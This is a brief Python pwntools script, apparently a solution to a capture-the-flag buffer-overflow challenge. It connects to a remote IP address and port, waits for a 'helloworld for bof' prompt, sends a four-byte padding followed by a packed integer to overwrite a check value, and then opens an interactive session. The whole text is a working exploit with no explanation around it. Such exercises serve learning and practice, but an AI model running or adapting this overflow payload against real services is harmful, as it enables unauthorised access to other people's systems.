from pwn import *
context.log_level='debug'
r=remote('220.249.52.133',44288)
r.recvuntil('lets get helloworld for bof')
payload='A'*0x4+p64(1853186401)
r.sendline(payload)
r.interactive()
